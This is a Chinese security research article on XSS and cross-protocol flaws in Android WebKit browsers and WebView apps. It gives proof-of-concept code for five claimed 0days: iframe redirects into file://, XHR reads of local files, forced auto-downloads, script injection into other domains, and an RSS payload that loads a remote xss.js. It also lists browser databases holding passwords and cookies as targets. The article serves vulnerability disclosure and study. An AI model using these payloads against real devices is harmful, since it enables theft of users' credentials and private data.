@@ -1,0 +1,636 @@
+Android应用安全之android平台上的xss攻击
+
+by SuperHei_at_www.80vul.com
+
+
+一、前言
+
+在智能手机和移动互联网高速发展的今天，移动设备上的安全也成为了安全研究领域的热
+门。“平民化的东西，才是最有前途的”，andriod平台的开放性及廉价门槛低等特点，直接
+造就了“平民”的特色，“平民化的才是大众的”,所以这个特点也导致了android平台上的
+各种各样的恶意应用的泛滥，目前很多的安全厂商和安全人员都在忙碌于各种恶意apk的分析
+上，而对其他的应用层上的安全问题研究甚少，而本文就是比较全面的分析了android平台上
+的xss漏洞的发现及利用...
+
+二、浏览器里的跨域
+
+1、android平台上的浏览器
+
+在android上的浏览器可以分为2类：
+  i、基于android自身集成的webkit上的浏览器。如：android自己浏览器     
+     (com.android.browser)，海豚、qq、遨游等。
+  ii、传统浏览器厂家的移动版浏览器。如firlefox、opera等。
+
+这里要强调的是，在于应用层我们看到的浏览器本质都是一个apk，所以对于漏洞的利用方式
+其实是有很多的共同点的。
+
+2、寻找浏览器的跨域漏洞
+
+对于PC平台上的经验来看，浏览器的跨域漏洞主要表现为2种类型：
+  i、http协议之间的跨域。主要体现在不利用应用程序xss漏洞的情况下，利用浏览器本身
+     处理javascript方面的漏洞实现跨站之间的数据读取等。
+  ii、通过http协议跨其他浏览器的伪协议。如http://-->file:// http://-->about:等浏
+     览器支持的伪协议。对于这类漏洞存在有2个必要条件：
+     a、http://可以调用目标伪协议[如http://调用file://在很多浏览器是被禁止或者受
+        限制的]
+     b、目标协议可以执行你注入的javasript[如实现协议本身的存在xss漏洞，或者对于 
+        file://来说我们可以写入任意html文件到本地然后调用]
+
+本文提到的主要是对于ii来说的，在webzine第五期的文章《走向本地的邪恶之路》里对攻击
+流程有这样的描叙：
+
+“外网通过iframe等标签-->本地存在xss漏洞的文件-->执行payload” 
+
+对于android平台上的浏览器跨域也是一样的，下面的一系列漏洞主要也是按照这个路径而进
+行的。
+
+那么我们先看看android上各大浏览器的伪协议，对于android上应用程序apk注册伪协议的方
+法主要是在AndroidManifest.xml里设置<data scheme="协议"></data>就可以了，如果需要
+得到浏览器支持，也就是在html里调用就必须设置 
+<category android:name="android.intent.category.BROWSABLE" /> 那么对于这些协议名
+的获取我们只要分析AndroidManifest.xml就可以得到了，至于这些协议的实现是不是存在这
+xss漏洞那就需要进一步分析测试了,所以这个方式就缺少通用性。
+
+对file://来说，在android平台上的浏览器来说都是禁止在http://的页面里直接调用的。
+
+另外还有一个很关键的问题需要确定：随着安全的发展，也可能看到了IE的“前车之鉴”，
+所以很多的浏览器都开始注意本地html的安全防御了，也就是说如果浏览器本地安全到位，
+那么即使你拥有在file://下执行js的能力，也不能实现最终攻击的目的。firefox及opera等
+浏览器来说，他们有安全的基础，所以移动版本也一样对于本地html文件的安全防御是下了
+功夫的[具体的请自行测试:)]，不过幸运的是，本文的主角android-webkit对于本地html的
+安全防御是非常薄弱的，本地的html文件可以任意跨域，这个也就是本文基石。
+
+[0day-NO.0]、android-webkit本地跨域漏洞：
+
+android-webkit在通过file://访问本地的html文件时，没有任何的同源策略限制，可以通过
+xhr等任意获取本地有读取权限的文件及http域网页的内容。POC如下：
+
+<script>
+var request = false;
+        if(window.XMLHttpRequest) {
+            request = new XMLHttpRequest();
+            if(request.overrideMimeType) {
+                request.overrideMimeType('text/xml');
+            }
+        } else if(window.ActiveXObject) {
+            var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 
+            'Microsoft.XMLHTTP', 
+            'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+            for(var i=0; i<versions.length; i++) {
+                try {
+                    request = new ActiveXObject(versions[i]);
+                } catch(e) {}
+            }
+        }
+        
+xmlhttp=request;
+
+//获取本地文件代码
+//xmlhttp.open("GET", "file://///default.prop", false);
+//获取http网页代码
+//xmlhttp.open("GET", "http://www.80vul.com/", false);
+xmlhttp.send(null);
+var ret = xmlhttp.responseText;
+
+alert(ret);
+</script>
+
+
+[ps:这个缺少chrome团队那些猥琐流大牛的参与有一定的关系？!(android浏览器和chrome目
+前好像还是2个独立的团队)] 
+
+OK! 一切按照原计划进行...
+
+3、android-webkit的0days
+
+我们根据上面提到的攻击流程走，所以我们的首要任务就需要跨越file://。
+
+[0day-NO.1]、android-webkit跨协议漏洞：
+
+android-webkit在处理转跳时存在漏洞，导致允许从http协议跨越其他的协议如file://协
+议，实现跨域漏洞。POC如下：
+
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///default.prop"; 
+} 
+setTimeout(init,5000) 
+</script> 
+
+location.php代码如下：
+<?php
+header("Location:file:///80vul.com");
+?>
+
+上面的代码完美实现了从http://到file://的跨越[android 4.0上已经不存在这个漏洞了]。
+我们继续接着流程走，下一步需要的所寻找可以注入任意javascript的“本地之门”了。
+
+[0day-NO.2]、android-webkit的file://协议xss漏洞：
+
+android-webkit在实现file://打开不存在的文件给出的提示对文件路径缺少过滤导致xss漏
+洞。POC如下：
+
+地址访问 file:///80vul.com/<script>alert(1);</script> 
+
+我们插入代码<script>alert(1);</script>将被执行。不过这个漏洞只存在于： 
+1.6<android<4.0 ，并且本身就有一个弹框提示，所以并不完美，我们继续...
+
+[0day-NO.3]、android-browser和firefox自动下载文件漏洞：
+
+adroid系统自带的浏览器com.android.browser在处理Content-Disposition: attachment的
+时候，UI设计存在漏洞，导致可以自动下载文件到固定的本地目录。POC如下：
+
+<? 
+//autodown.php
+header("Content-Disposition: attachment:filename=autodown.htm"); 
+$data=<<<android_xss_go
+<script>alert(/xss/);</script>
+android_xss_go;
+print $data;
+?>
+
+在上面的代码在不同的版本的android系统上是不一样的：
+android 1.x 自动下载保存文件名为：/sdcard/download/autodown.html
+android 2.x-3.x 自动下载保存文件名为：/sdcard/download/autodown.htm
+android 4.0 自动下载保存文件名为：/sdcard/download/autodown.php
+firefox 自动下载保存文件名为：/sdcard/download/autodown.php
+
+上面的测试结果来看，路径和文件名都是相对固定的，并且html/htm/php后缀都是可以被解
+析（渲染）的。对于其他的基于android-webkit的外壳浏览器，如：android自己浏览器
+(com.android.browser)，海豚、qq、遨游等都在UI设计上有所加强，对于下载文件都有提示
+保存。
+
+
+OK,攻击流程里的2个步骤条件都已经满足了，最后给出我们的POC：
+
+POC[1]:
+//[0day-NO.1]+[0day-NO.2]
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///ssss<sc"+"ript>alert(1);</sc"+"ript>/";
+} 
+setTimeout(init,5000) 
+</script> 
+
+POC[2]:
+//[0day-NO.1]+[0day-NO.3]
+<meta http-equiv="refresh" content="0;URL=autodown.php"/> 
+<iframe name=f src="location.php" ></iframe> 
+<script> 
+function init(){ 
+  f.location = "file:///sdcard/Download/autodown.htm"; 
+} 
+setTimeout(init,5000) 
+</script> 
+
+万事具备，只切欠payload ...
+
+4、不仅仅是弹框
+
+通过上面的一系列0days跨越file://后，可以自由的弹JJ了，如果你不是一个单纯的BT，应
+该可以思考一下：“我还可以做点啥子邪恶的事情呢？” ...
+
+i、跨越任意http
+
+最基本的利用，我们又从file杀回http了！！只是这个http已经不在是你那蹩脚的.cn的域名
+了，我们可以去其他的http潇洒了，去80vul.com怎么样？ 请出PZ牛写的经典code:
+
+//payload.js
+function inject(){
+	var d = document.getElementById("hi").contentDocument || document.getElementById("hi").contentWindow.document
+	var x = d.createElement("SCRIPT");
+	x.src ="x.js"; //在目标域调用的js
+	x.defer = true;
+	d.getElementsByTagName("HEAD")[0].appendChild(x);
+}
+document.write("<iframe id=hi src=http://www.80vul.com onload=inject()></iframe>")
+
+//x.js
+alert(document.domain);
+
+调用如下代码后，就可以在www.80vul.com域里执行js代码：alert(document.domain);了 ...
+
+ii、跨越market.android.com实现自动下载安装恶意apk
+
+其实这个方式就是上面i里的一个特例子，因为在market.android.com域里可以直接通过js实
+现在手机上自动下载安装恶意apk。这个方法最早又大牛jonoberheide提出，详
+见《How I Almost Won Pwn2Own via XSS》[1]
+
+这个方法目前还是可用的，在我写的《Android应用安全之开发环境带来的危险》一文里也有
+应用。具体实现codz，可以参考《Android应用安全之开发环境带来的危险》一文。
+
+iii、挖掘本地文件
+
+上面跨http方式对于目前手机系统来说有个致命的弱点：为了弥补在显示和操作方面的先天
+不足，广泛采用apk机制，也就是说把各大sns应用都开发自己的手机客服端应用，这个方式
+直接扼杀了浏览器跨域漏洞跨单纯http协议之间上利用价值。所以我们有必要挖掘一下其他
+方向的利用！！ 现在我们处于file://域下，在webkit里我们完全可以通过xmlhttp来读取本
+地文件来获取多我们有用的信息，下面要做的就是看我们对那些文件有读取的权限。
+
+在这之前，我们先要了解一下android的安全机制：“Android 是一个权限分离的系统。这是
+利用 Linux 已有的权限管理机制，通过为每一个Application分配不同的 uid 和 gid，从而
+使得不同的 Application 之间的私有数据和访问（ native 以及 java 层通过这种 
+sandbox 机制，都可以）达到隔离的目的。”
+
+对于android上的浏览器来说，一个浏览器就是一个Application，对于系统来说分配给这个
+浏览器一个uid。这个可以说明2个问题：
+
+* 对应用程序的owner数据文件有读取权限
+* 对系统里设置了other可读的文件有读取权限
+
+下面我们找找这些文件里都有些什么有价值的信息：
+
+a、寻找owner的数据文件
+
+我们以com.android.browser为例子。 先去/data/data/com.android.browser目录的属性：
+
+# ls -l /data/data/
+ls -l /data/data/
+drwxr-x--x app_20   app_20            2011-09-10 12:12 com.android.browser
+drwxr-x--x app_0    app_0             2011-09-26 04:15 com.android.providers.downloads
+drwxr-x--x app_7    app_7             2011-09-10 12:03 com.android.wallpaper.livepicker
+drwxr-x--x app_8    app_8             2011-09-10 12:03 com.android.fallback
+.....
+
+# ls -l /data/data/com.android.browser
+ls -l /data/data/com.android.browser
+drwxrwx--x app_20   app_20            2011-09-10 12:12 app_thumbnails
+drwxrwx--x app_20   app_20            2011-09-10 12:12 app_databases
+drwxrwx--x app_20   app_20            2011-09-10 12:12 app_appcache
+drwxrwx--x app_20   app_20            2011-10-04 04:25 cache
+drwxrwx--x app_20   app_20            2011-10-28 10:05 shared_prefs
+drwxr-xr-x system   system            2011-09-10 12:03 lib
+drwxrwx--x app_20   app_20            2011-09-26 04:05 app_geolocation
+drwxrwx--x app_20   app_20            2011-11-16 13:53 app_icons
+drwxrwx--x app_20   app_20            2011-11-16 14:12 databases
+
+# cd /data/data/com.android.browser
+cd /data/data/com.android.browser
+# ls -l databases
+ls -l databases
+-rw-r--r-- app_20   app_20        512 2011-11-16 14:28 webviewCache.db-journal
+-rw-rw---- app_20   app_20      19456 2011-11-16 13:54 webview.db
+-rw-rw---- app_20   app_20      17408 2011-11-16 13:53 browser.db
+-rw-rw---- app_20   app_20     113664 2011-11-16 13:55 webviewCache.db
+# ls -l app_databases/localstorage
+ls -l app_databases/localstorage
+-rw-r--r-- app_20   app_20       4096 2011-10-05 11:38 http_phpforandroid.net_0.localstorage
+-rw-r--r-- app_20   app_20      17408 2011-10-11 12:30 http_www.google.cn_0.localstorage
+-rw-r--r-- app_20   app_20       4096 2011-10-05 11:58 http_mediacdn.disqus.com_0.localstorage
+-rw-r--r-- app_20   app_20    1191936 2011-11-16 13:54 http_www.google.com_0.localstorage
+# ls -l app_geolocation
+ls -l app_geolocation
+-rw-rw---- app_20   app_20       3072 2011-09-26 04:05 CachedGeoposition.db
+
+看看这些数据库里都有些啥子东西呢?
+
+# sqlite3 webview.db
+sqlite3 webview.db
+SQLite version 3.6.22
+Enter ".help" for instructions
+Enter SQL statements terminated with a ";"
+sqlite> .tables
+.tables
+android_metadata  formdata          httpauth
+cookies           formurl           password
+# sqlite3 browser.db
+sqlite3 browser.db
+SQLite version 3.6.22
+Enter ".help" for instructions
+Enter SQL statements terminated with a ";"
+sqlite> .tables
+.tables
+android_metadata  bookmarks         searches
+
+包括保存的密码、cookie、访问url、bookemarks 甚至还有localstorage和地址信息等。
+
+b、寻找other可读的文件
+
+不一样的系统rom可能结果会不一样，我们可以用脚本简单实现一个scan，我这里用的
+android-php：http://phpforandroid.net/，然后我们需要用有root的adb shell ：
+
+# /data/data/com.irontec.phpforandroid/files/php/bin/php /mnt/sdcard/sl4a/scripts/find.php "/data/"
+/data/data/com.irontec.phpforandroid/files/php/bin/php /mnt/sdcard/sl4a/scripts/find.php "/data/"
+FIX ME! implement getprotobyname() bionic/libc/bionic/stubs.c:378
+FIX ME! implement getprotobyname() bionic/libc/bionic/stubs.c:378
+/data/anr/traces.txt
+...
+/data/data/com.android.browser/app_databases/localstorage/http_www.google.cn_0.localstorage
+/data/data/com.android.browser/app_databases/localstorage/http_mediacdn.disqus.com_0.localstorage
+/data/data/com.android.browser/app_databases/localstorage/http_www.google.com_0.localstorage
+/data/data/com.android.browser/app_databases/localstorage/http_phpforandroid.net_0.localstorage
+/data/data/com.android.browser/app_databases/localstorage/http_t.qq.com_0.localstorage
+...
+/data/data/com.android.music/shared_prefs/Music.xml
+/data/data/jp.co.omronsoft.openwnn/writableJAJP.dic
+/data/data/jp.co.omronsoft.openwnn/writableEN.dic
+/data/system/packages.list
+/data/system/packages.xml
+/data/system/uiderrors.txt
+
+上面的结果我处理掉了一些.apk .dex .so文件。没想到的是com.android.browser的
+localstorage文件是other可读的！！
+
+/data/system/packages.list
+/data/system/packages.xml
+
+可以得到目标系统安装哪些应用及应用的配置(如权限）等，在
+/data/system/uiderrors.txt还可以得到一些错误的信息等等。如何我们继续会发现一些可
+以读文件；包括：
+
+/ueventd.rc
+/ueventd.goldfish.rc
+/init.rc
+/init.goldfish.rc
+/default.prop
+/system/build.prop
+/system/etc/目录下的一些配置文件
+
+在我们跑脚本的过程里你会发现2个让你的脚本死循环的目录/sys/及/proc/，这个本来就是
+linux下的虚拟文件系统，由于各种挂载导致脚本死循环，但在这2个目录我们可以得到手机
+系统很多信息。如：
+
+# ls -l /proc/
+ls -l /proc/
+dr-xr-xr-x root     root              2011-11-17 09:35 binder
+-r--r--r-- root     root            0 2011-11-17 09:35 mtd
+--w--w---- root     system          0 2011-11-17 09:35 sysrq-trigger
+-r--r--r-- root     root            0 2011-11-17 09:35 partitions
+-r--r--r-- root     root            0 2011-11-17 09:35 diskstats
+-r--r--r-- root     root            0 2011-11-17 09:35 crypto
+-r--r--r-- root     root            0 2011-11-17 09:35 yaffs
+-r-------- root     root            0 2011-11-17 09:35 kpageflags
+-r-------- root     root            0 2011-11-17 09:35 kpagecount
+-r--r----- root     system          0 2011-11-17 09:35 kmsg
+-r--r--r-- root     root            0 2011-11-17 09:35 version
+-r--r--r-- root     root            0 2011-11-17 09:35 uptime
+-r--r--r-- root     root            0 2011-11-17 09:35 stat
+-r--r--r-- root     root            0 2011-11-17 09:35 meminfo
+-r--r--r-- root     root            0 2011-11-17 09:35 loadavg
+-r--r--r-- root     root            0 2011-11-17 09:35 interrupts
+-r--r--r-- root     root            0 2011-11-17 09:35 devices
+-r--r--r-- root     root            0 2011-11-17 09:35 cpuinfo
+-r--r----- root     radio           0 2011-11-17 09:35 cmdline
+-r--r--r-- root     root            0 2011-11-17 09:35 locks
+-r--r--r-- root     root            0 2011-11-17 09:35 filesystems
+-rw-r--r-- root     root            0 2011-11-17 09:35 slabinfo
+-r--r--r-- root     root            0 2011-11-17 09:35 swaps
+-r--r----- root     log             0 2011-11-17 09:35 vmallocinfo
+-r--r--r-- root     root            0 2011-11-17 09:35 zoneinfo
+-r--r--r-- root     root            0 2011-11-17 09:35 vmstat
+-r--r--r-- root     root            0 2011-11-17 09:35 pagetypeinfo
+-r--r--r-- root     root            0 2011-11-17 09:35 buddyinfo
+-r--r--r-- root     root         7087 2011-11-17 09:35 config.gz
+-r--r--r-- root     root            0 2011-11-17 09:35 kallsyms
+-rw-r--r-- root     root            0 2011-11-17 09:35 timer_list
+-r--r--r-- root     root            0 2011-11-17 09:35 iomem
+-r--r--r-- root     root            0 2011-11-17 09:35 ioports
+-r--r--r-- root     root            0 2011-11-17 09:35 execdomains
+-r--r--r-- root     root            0 2011-11-17 09:35 schedstat
+-r--r--r-- root     root            0 2011-11-17 09:35 sched_debug
+dr-xr-xr-x root     root              2011-11-17 09:35 cpu
+-r--r--r-- root     root            0 2011-11-17 09:35 misc
+-r--r--r-- root     root            0 2011-11-17 09:35 fb
+-r--r--r-- root     root            0 2011-11-17 09:35 wakelocks
+dr-xr-xr-x root     root              2011-11-17 09:35 irq
+-r--r--r-- root     root            0 2011-11-17 09:35 cgroups
+dr-xr-xr-x root     root              2011-11-17 08:17 sys
+dr-xr-xr-x root     root              2011-11-17 09:35 bus
+dr-xr-xr-x root     root              2011-11-17 09:35 tty
+dr-xr-xr-x root     root              2011-11-17 09:35 driver
+dr-xr-xr-x root     root              2011-11-17 09:35 fs
+dr-xr-xr-x root     root              2011-11-17 09:35 sysvipc
+lrwxrwxrwx root     root              2011-11-17 09:35 net -> self/net
+lrwxrwxrwx root     root              2011-11-17 09:35 mounts -> self/mounts
+lrwxrwxrwx root     root              2011-11-17 08:17 self -> 2223
+dr-xr-xr-x root     root              2011-11-17 08:17 1
+dr-xr-xr-x root     root              2011-11-17 08:17 2
+dr-xr-xr-x root     root              2011-11-17 08:17 3
+dr-xr-xr-x root     root              2011-11-17 08:17 4
+....
+
+得到有用的系统/内核信息 如：
+
+/proc/cpuinfo - CPU 的信息 (型号, 家族, 缓存大小等)
+/proc/meminfo - 物理内存、交换空间等的信息
+/proc/mounts - 已加载的文件系统的列表
+/proc/devices - 可用设备的列表
+/proc/filesystems - 被支持的文件系统
+/proc/version - 内核版本
+/proc/cmdline - 系统启动时输入的内核命令行参数
+.....
+
+得到有关运行中的进程的信息 如：
+
+# ls -l /proc/1
+ls -l /proc/1
+dr-xr-xr-x root     root              2011-11-17 09:38 task
+dr-x------ root     root              2011-11-17 09:38 fd
+dr-x------ root     root              2011-11-17 09:38 fdinfo
+dr-xr-xr-x root     root              2011-11-17 09:38 net
+-r-------- root     root            0 2011-11-17 09:38 environ
+-r-------- root     root            0 2011-11-17 09:38 auxv
+-r--r--r-- root     root            0 2011-11-17 09:38 status
+-r-------- root     root            0 2011-11-17 09:38 personality
+-r-------- root     root            0 2011-11-17 09:38 limits
+-rw-r--r-- root     root            0 2011-11-17 09:38 sched
+-r--r--r-- root     root            0 2011-11-17 08:17 cmdline
+-r--r--r-- root     root            0 2011-11-17 08:17 stat
+-r--r--r-- root     root            0 2011-11-17 09:38 statm
+-r--r--r-- root     root            0 2011-11-17 08:40 maps
+-rw------- root     root            0 2011-11-17 09:38 mem
+lrwxrwxrwx root     root              2011-11-17 09:38 cwd -> /
+lrwxrwxrwx root     root              2011-11-17 09:38 root -> /
+lrwxrwxrwx root     root              2011-11-17 09:38 exe -> /init
+-r--r--r-- root     root            0 2011-11-17 09:38 mounts
+-r--r--r-- root     root            0 2011-11-17 09:38 mountinfo
+-r-------- root     root            0 2011-11-17 09:38 mountstats
+--w------- root     root            0 2011-11-17 09:38 clear_refs
+-r--r--r-- root     root            0 2011-11-17 09:38 smaps
+-r-------- root     root            0 2011-11-17 09:38 pagemap
+-r--r--r-- root     root            0 2011-11-17 09:38 wchan
+-r--r--r-- root     root            0 2011-11-17 09:38 schedstat
+-r--r--r-- root     root            0 2011-11-17 09:38 cgroup
+-r--r--r-- root     root            0 2011-11-17 09:38 oom_score
+-rw-r--r-- root     root            0 2011-11-17 08:17 oom_adj
+-rw-r--r-- root     root            0 2011-11-17 09:38 coredump_filter
+# cat /proc/1/maps
+cat /proc/1/maps
+00008000-0001e000 r-xp 00000000 00:01 19         /init
+0001e000-0001f000 rwxp 00016000 00:01 19         /init
+0001f000-0002d000 rwxp 0001f000 00:00 0          [heap]
+40000000-40001000 r-xp 40000000 00:00 0
+40001000-40009000 rwxs 00000000 00:0a 198        /dev/__properties__ (deleted)
+bee20000-bee35000 rw-p befeb000 00:00 0          [stack]
+
+
+至于这些相信的利用要取决于你对linux系统的理解程度，我基本是个菜鸟，所以后面直接略
+过咯 ：）
+
+c、sdcard权限设置的悲剧
+
+其实在上面“寻找other可读的文件”时候，好像漏掉了一个目录，那就所/sdcard/ 其实是
+挂载的/mnt/sdcard/，sdcard在手机系统里有这特殊的意义：为了减少系统的压力，很多的
+应用数据文件、还有备用的文件都保存在/sdcard里。所以如果sdcard的文件可读，那么得到
+的信息也是很巨大的。 我们看一下sdcard目录属性：
+
+ls -l /mnt/
+drwxr-xr-x root     system            2011-11-17 08:17 obb
+drwxr-xr-x root     system            2011-11-17 08:17 asec
+drwx------ root     root              2011-11-17 08:17 secure
+d---rwxr-x system   sdcard_rw          1970-01-01 00:00 sdcard
+
+虽然是独立用户组，但是它是对other可读的！！ 如：
+
+# ls -l /sdcard/tencent/
+ls -l /sdcard/tencent/
+d---rwxr-x system   sdcard_rw          2011-08-31 20:56 QQ
+d---rwxr-x system   sdcard_rw          2011-11-09 18:10 MicroMsg
+d---rwxr-x system   sdcard_rw          2011-11-10 07:25 weibo
+# ls -l /sdcard/tencent/qq
+ls -l /sdcard/tencent/qq
+d---rwxr-x system   sdcard_rw          2011-10-03 17:15 data
+d---rwxr-x system   sdcard_rw          2011-10-22 18:06 log
+d---rwxr-x system   sdcard_rw          2011-08-27 12:58 Qzone
+d---rwxr-x system   sdcard_rw          2011-08-31 20:56 download
+# ls -l /sdcard/tencent/qq/data
+ls -l /sdcard/tencent/qq/data
+----rwxr-x system   sdcard_rw     8192 2011-10-03 17:15 QQ_database
+
+
+如果有使用有备用电话的联系人短信的功能apk话，如果路径固定，说不定还可以得到这些要
+命的东西 ：）
+
+
+三、其他应用程序(apk)里的XSS
+
+浏览器本质上其实也就是一个应用程序，只是浏览器本身存在的原因就是处理html/js等元
+素。上面我们也提到了，由于官方采用的应用程序化的机制，直接削弱了浏览器的使用。各
+大SNS的网络都推出了基于apk的应用程序客服端，所以我们研究应用程序里的xss是非常有必
+要的...
+
+1、其他apk的html/js处理方式
+
+“有html/js的地方，就有可能有xss漏洞”所以我们首先要找的就是一般是那些情况下引入
+html/js，就以往的经验来看我首先想到的是Html.fromHtml处理字符的方式，不过经过测
+试，Html.fromHtml()目前功能还非常弱，支持有限的tag，最主要的是根本不支持js，所以
+这个基本就可以放弃了！ 
+
+android应用开发里要引用html/js的方法目前比较常用就的是调用webview控件来实现。对
+于webview控件的介绍详细见官方的手册：[2]
+
+
+2、webview控件3种方式与对应的“域” 
+
+webview控件在load网页时有3种方式：
+   
+    (1)、webview.loadUrl(url);
+    (2)、webview.loadData(data,  "text/html", "utf-8");
+    (3)、webview.loadDataWithBaseURL(baseUrl, data, "text/html", "utf-8", null);
+
+另外webview默认是不支持js的，要支持js还必须webSetting进行设置：webSetting.setJavaScriptEnabled(true); 
+
+我们再看看这3种方式调用的js所在的域：
+
+(1)、webview.loadUrl(url);
+对于这种方式，js执行的domain取决于url的domain。此时这个webview就相当于一个基于
+android-webkit的第三方外壳浏览器。那么这个url当然也可以是file://和javascript:等伪
+协议。对于这样的方式存在的xss漏洞，他的威力完全取决于url这个参数。如果在应用程序
+里这个url可以控制，那么我们可以直接指定它到file://那么所有的攻击又回到了浏览器里
+跨域的利用方式了。当然，当只可以在http://下时上面提到的android-webkit的漏洞都是一
+样的。
+(2)、webview.loadData(data,  "text/html", "utf-8");
+这种调用方式就相当于在浏览器里使用"data:text/html;<html>"伪协议,及时在应用程序里
+可以控制第一个参数data导致xss漏洞，那它执行的js的域也是在空白域，如果不使用
+webkit的漏洞的话，基本上是没有太多办法跨域的。也就是说目前这种类型的xss基本就只有
+靠webkit的漏洞的来实现跨域了。
+(3)、webview.loadDataWithBaseURL(baseUrl, data, "text/html", "utf-8", null);
+相比上面2个函数，这个函数可以控制Url及执行的data。那么这样的方式导致的xss漏洞，执
+行域也取决于baseUrl，这个相比(1)里的url来说，它可以是其他随意的“域” 如：
+webview.loadDataWithBaseURL(“aaa”, data, "text/html", "utf-8", null);
+那么他执行的js就是在"aaa"域下。对于这样的方式好像也没有太多的利用，不过经过我的测
+试发现，这个方式可以通过转跳到任意域包括file://，也就是我们的[0day-NO.4]！
+
+3、[0day-NO.4]、webview.loadDataWithBaseURL()跨协议漏洞
+
+webview.loadDataWithBaseURL()在可以控制第2个参数的情况下，可以通过js转跳来跨越其
+他的协议如file://协议，导致跨域漏洞。DEMO:
+
+        WebView webview;
+        webview = (WebView) findViewById(R.id.webview);
+        webview.getSettings().setJavaScriptEnabled(true);
+        webview.setWebChromeClient(new WebChromeClient());
+        String data="80vul<script>window.location='file://///default.prop';</script>";
+        webview.loadDataWithBaseURL("http://www.baidu.com/", data, "text/html", "utf-8", null);
+
+所以在实际apk通过loadDataWithBaseURL导致的xss的利用还是有希望的，不过实际攻击的情
+况下，你还需要把你的js代码注入到file://下，[0day-NO.2]及[0day-NO.3]可能是比较好的
+选择，或许还有其他的方法？：）
+
+4、利用
+
+因为一般的SNS的apk应用都是采用网络api的方式验证登录的，所以传统的得到cookie的方式
+基本上没有什么意义!，对于在http://下跨基本上效果是非常有限的，所以大体上利用如下：
+
+a、利用webview.loadUrl在file://下，并且可以注入js的情况下实现file://下的利用。
+b、利用webview.loadUrl通过file://调用资源的情况下放置xss“后门”。
+c、利用webkit-webkit的漏洞实现跨file://。
+d、利用webview.loadDataWithBaseURL()跨协议漏洞来跨file://。
+
+5、一个DEMO
+
+[0day-NO.5]、com.htc.googlereader XSS 漏洞
+
+我们发现在HTC自带的rss阅读的应用com.htc.googlereader在处理未读状态的rss内容里的
+<description> tag时可以注入执行任意javascript。POC如下：
+
+设置rss：
+
+        <item>
+            <guid>http://www.80vul.com</guid>
+            <title>0day-NO.5</title>
+            <link>http://www.80vul.com</link>
+            <description><![CDATA[aa&lt;script src=&apos;http://www.80vul.com/xss.js&apos;&gt;&lt;/script&gt;]]></description>
+            <dc:creator>80vul</dc:creator>
+            <category>anddoid</category>
+            <pubDate>Sun, 04 Sep 2011 13:01:40 -0500</pubDate>
+        </item>
+
+
+订阅后，点击标题后将执行插入的http://www.80vul.com/xss.js，弹出来的窗口信息提示我
+们脚本所在“http://”下执行的，很特别，按照上面的分析，导致这个情况的很有可能是
+webview.loadDataWithBaseURL()，果断反编译看下找到如下代码：
+
+        label399: String str = this.mHeadlineShown.getSummary();
+        if (str.trim().contains("<iframe"))
+        {
+          this.mWebView.loadData(str, "text/html", "utf-8");
+          break label246;
+        }
+        this.mWebView.loadDataWithBaseURL("http://", str, "text/html", "utf-8", null);
+        break label246;
+
+至于payload我们使用，[0day-NO.4]+[0day-NO.2]来demo一下：
+
+xss.js代码如下：
+
+window.location="file:///ssss<script>alert(1);</script>/";
+
+四、后话
+
+其实本文是用传统分析方法对android平台上的浏览器跨域及应用apk上的xss漏洞的从发现到
+利用过程进行一次比较详细的剖析。另外本文虽然给出了5个0day，但是要达到实际的攻击效
+果需要各种各样的组合型攻击才有效果，这种方式也是目前从系统底层到应用的漏洞利用的
+常用方式，尤其表现在各种防御突破上及实现漏洞利用的各种条件上。还有就是本文是我入
+手android不足2个月内发现的一些东西，在某些认识及描叙上肯定存在很多错误的地方，希
+望大家指正！最后要感谢luoluo的指点及提供的各种demo apk。
+
+
+五、参考
+[1]http://jon.oberheide.org/blog/2011/03/07/how-i-almost-won-pwn2own-via-xss/
+[2]http://developer.android.com/reference/android/webkit/WebView.html
+
+-EOF-
